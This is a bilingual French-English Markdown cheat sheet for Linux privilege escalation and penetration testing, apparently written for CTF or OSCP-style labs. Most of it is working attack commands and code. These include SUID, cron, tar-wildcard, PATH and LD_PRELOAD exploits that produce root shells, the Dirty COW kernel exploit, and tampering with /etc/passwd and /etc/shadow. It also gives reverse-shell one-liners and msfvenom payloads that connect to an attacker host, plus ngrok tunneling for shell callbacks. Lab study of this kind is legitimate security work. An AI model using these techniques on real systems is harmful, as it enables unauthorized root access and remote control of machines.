
### Scripts : 
LinEnum -> comme LinPeas  
Enumerate privEsc factors  
linux-exploit-suggester.sh  

### Mettre LinEnum sur la machine cible :
	- python3 -m http.server 8000 		-> Ouvre une serveur web python en local
	- ngrok http 8000			-> Port forwarding
	- wget https://ngrok.io:port/linEnum.sh		-> copie le fichier sur la machine vulnérable
		

### A la main :  
### ABUSING SUID FILES :  
```bash
find / -perm -u=s -type f 2>/dev/null
```
ou
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
then search suspect SUID in GTFOBINS


### KNOWN EXPLOIT : 
looking for the exploit in exploit-db.com or google ...


### ABUSING SHELL FEATURES : 
***context :***

The  executable is identical to /usr/local/bin/suid-env  
except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
```bash
/bin/bash --version -> verify the version is under 4.2-048
```
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```
### ABUSING SHELL FEATURE #2
(will not work on bash version 4.4 and above)  
(vuln with debugging bash enabled)  
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env
/tmp/rootbash -p
```


### WRITEABLE /ETC/PASSWD
modifier le password du root / creer un nouvel account avec des perms root
- create a new password hash : 
```bash
openssl passwd -1 -salt [salt] [password]
```
ou
```bash
ou juste : openssl passwd [newpassword]
```

***FORMAT PASSWD :***
***test:x:0:0:root:/root:/bin/bash ***
[as divided by colon (:)]  
Username: It is used when user logs in. It should be between 1 and 32 characters in length.  
Password: An x character indicates that encrypted password is stored in /etc/shadow file. sha512  
User ID (UID): Each user must be assigned a user ID (UID).   
UID 0 = root /   
UIDs 1-99 other predefined accounts.   
UID 100-999 are reserved by system for administrative and system accounts/groups.  
UID 1000+ users  
Group ID (GID): The primary group ID (stored in /etc/group file)  
User ID Info: extra information about the users.  
Home directory: The absolute path to the directory the user will be in when they log in  
Command/shell: The absolute path of a command or shell (/bin/bash). 

### READABLE /ETC/SHADOW :
crack the hash with john : it's supposed to be sha-512
### WRITABLE /ETC/SHADOW :
make a new password : 
```bash
mkpasswd -m sha-512 newpasswordhere
```


### SHELL ESCAPE : https://gtfobins.github.io
```bash
$sudo -l  
```

### EXLOITING CRON JOBS :
- view which ones are actives : 
```bash
$cat /etc/crontab
```
On regarde si certains se lance avec des droits root et si on peut les modifier  
Si oui, il y a la place pour un reverse shell  


Format =# = ID  
m = Minute  
h = Hour  
dom = Day of the month  
mon = Month  
dow = Day of the week  
user = What user the command will run as  
command = What command should be run  
For Example :    
-  m   h dom mon dow user  command  
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly

### WRITEABLE CRON JOBS :
### Exemple :
##### REVERSE SHELL :
on écrit l'imitation du file et on setup un listener (en ayant remplacer l'ip et le port:
```bash
#!/bin/bash
bash -i >& /dev/tcp/[Adresse IP]/4444 0>&1
```
```bash
nc -lvnp 4444
```

##### ROOTBASH :
locate PATH  
make an imitating file with :
```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
```
```bash
chmod +xs /tmp/rootbash
chmod +x /path/filename.sh
```
wait for the cron job executing
```bash
/tmp/rootbash -p
```
##### OVERWRITING CRONS
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
wait till it executes
/tmp/bash -p


### TAR COMMAND 
Si dans un cron job une commande comme tar est run avec *   
alors elle incluera tous els fichiers selectionnés lors de l'exec.  
Si les noms des fichiers sont des options de commande correct alors   
on peut executer d'autres fichiers.  
donc :   
***quand on cat le fichier on lit blabla tar '*' :**
```bash
cat /usr/local/bin/compress.sh
```
REVERSE root SHELL
on créee un payload qu'on envoie avec un serv python ou en copier coller (en php par ex):
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
```
on cree des fichiers qui seront executés comme des <flag> de la commande tar
```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
on setup un netcat et on attend
```
nc -nvlp 4444
```

#### ROOTBASH
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

4. Wait 1 minute for the Bash script to execute.
```bash
5. In command prompt type: /tmp/bash -p
```

### EXPLOITING PATH VARIABLE
On regarde le nom des fichiers qui sont executés  
On se déplace dans /tmp et on crée un fichier du même nom avec le script dedans
```bash
echo $PATH
```
On commence par cree le faux script
```bash
cd /tmp
$echo "[whatever command we want to run]" > [name of the executable we're imitating] 
```

***exemple : ***
```bash
echo "/bin/bash" > ls
$chmod +x filename	-> x rend le fichier executable
$export PATH=/tmp:$PATH -> on met /tmp dans le PATH
```

et on réexecute le file

### MOT DE PASSE ACCIDENTELLEMENT TAPÉ :
si un user à accidentellement tapé un mot de passe dans une vraie ligne :
c'est rangé dans history ou :
```bash
cat ~/.*history | less
```

### CONFIG FILES : (.ovpn par exemple)
Ils ne contiennent pas le mot de passe mais peuvent contenir l'emplacement des fichiers qui les contiennent

### SSH PRIVATE KEY :
Suppose that you found the id_rsa file of a remote user
- copy it in the local machine
```bash
chmod 600 id_rsa
ssh -i id_rsa username@ipaddress
```

### NFS root_squashing
```
cat /etc/exports -> ici on avait trouvé no_root_squash
```
sur notre machine :
on doit run en tant que root donc : 
```bash
sudo su
mkdir /tmp/nfs
mount -o rw,vers=2 <targetIP>:/tmp /tmp/nfs
```
on crée un payload qui pop un simple bash
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +x /tmp/nfs/shell.elf
```
Sur la target :
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf4
```

### LD_PRELOAD : 
1. Open a text editor and type:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

### SUID/SGID SHARED OBJECTS INJECTION
( On cherche les SUID qu'il manque pour les recreer )
```bash
└─strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
From the output, notice that a .so file is missing from a writable directory.
***.so is compiled .c***
##### Output example : 

open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

Donc, on va recreer le SUID car on a remarqué qu'on pouvait écrire dans /home/user/  
```bash
nano /home/user/.config/libcalc.c  
```
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
on compile et on execute: 
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

### SUID SYMLINK
```bash
dpkg -l | grep nginx
```
From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3  
For this exploit, it is required that the user be www-data  
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log  
At this stage, the system waits for logrotate to execute (THIS CAN BE LONG)  

### SUID/SGID EVIRONNEMENT VARIABLE
```
sudo -l / output suid-env
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```
```bash
sudo -l / output suid-env2
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### KERNEL EXPLOIT :
1 ) run the linux exploit suggester_pl   
perl PATH/SCRIPT.PL  
2 ) use the desired vuln : here dirty cow  
compile :
```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```
run and let it finish : 
```
./c0w	
/usr/bin/passwd	-> allow to gain te root shell
```
### CAPABILITIES
```bash
getcap -r / 2>/dev/null
```
From the output, notice the value of the “cap_setuid” capability.  
#### Example : 
/usr/bin/python2.6 = cap_setuid+ep
```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


Les endroits où faire des recherches:
https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
https://payatu.com/guide-linux-privilege-escalation



# CHEATSHEET 

### ENUMERATION :
```bash
nmap -p- -vv -sV IP
```


### SERVER WEB
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x txt,php,html,js -u http://10.10.245.130
```

### SMB (139 445)
```bash
enum4linux IP
smbclient //IP//Share
```


### FTP
***(anonymous login)***  
writeable files ?
get <filename>

### WEB
Look for commentary (even in default page)  
enumerate (gobuster)  
look for login form (Bruteforce)  
Commentary form (XSS)  


## PRIVESC
```bash
sudo -l (certains fichiers sont peut être modifiables ? $PATH ? Verify owner)
```
####/etc/passwd
- Droits sur /etc/passwd 
```bash
openssl passwd newpasswordhere
```
```test:x:0:0:root:/root:/bin/bash```  
### /etc/shadow
Droits sur /etc/shadow (hash pour "hashcat")
```bash
mkpasswd -m sha-512 newpasswordhere
```
Le resultat doit être comme suit : 
```
newroot:$6$K9AELjcE4suxukCp$vNLveaks59l46HZOT5TCaxMa1xI6agxYmAFE9CMWCY9/LtBWhzlKM6k4ivhCCntbtFB/Exh3SifcOP9UZ2SIS.:19328:0:99999:7:::
```
### /etc/sudoers
```bash 
sudo -l 
```
- Droits sur /etc/sudoers  
***user ALL = (root) NOPASSWD: ALL***
### /etc/group
- Droits sur /etc/group  
append user at end of root:x:0:<UTILISATEUR>
### SUID : GTFObins
```bash
find / -perm -u=s -type f 2>/dev/null
```

### PATH Variable
### ssh private key
### mots de passes accidentellement tapés (history)
### Cronjobs
### Look for stuff in config files (important in CMS)
### Look for kernel exploit (exploit-suggester.pl)


### REVERSE SHELL NON INTERACTIVE SHELL
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.3.225 1234 >/tmp/f
bash -i >& /dev/tcp/10.11.3.225/1234 0>&1
```


### STABILISER UN REVERSE SHELL
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'; 
export TERM=xterm ; export SHELL=bash
```

## COMMAND LINE CHEATSHEET
##### Upload to SSH
```bash
scp [filename] [username]@[IP of remote machine ]:[directory to upload to on remote machine]
```
##### Download from SSH
```bash
scp remoteuser@remoteIP:path/to/remote/file localdir/
```
##### AES Encryt
```bash
gpg --cipher-algo [encryption type] [encryption method] [file to encrypt]
gpg --cipher-algo AES-256 --symmetric secret.txt
```
##### Connect to MYSQL remote server
```bash
mysql -u [username] -p -h [host ip]
```
View a .sql file (depuis mysql) /!\ il fait être dans le dosser du fichier
```bash
source file.sql
```


## SQL CHEATSHEET :
```sql
SHOW DATABASES;
USE db_name;
SHOW TABLES;
DESCRIBE table_name;
```

## USE NGROK
***FORWARD AN HTTP SERVER***
```bash
ngrok http <port where the server is running>
```
***FORWARD A TCP PORT (REVERSE SHELL)***
```bash
nc -lvp <listening port>
```
Dans un second terminal
```bash
ngrok tcp <same port>
```
The IP and port are  now the ngrok.eu.io....:<port>
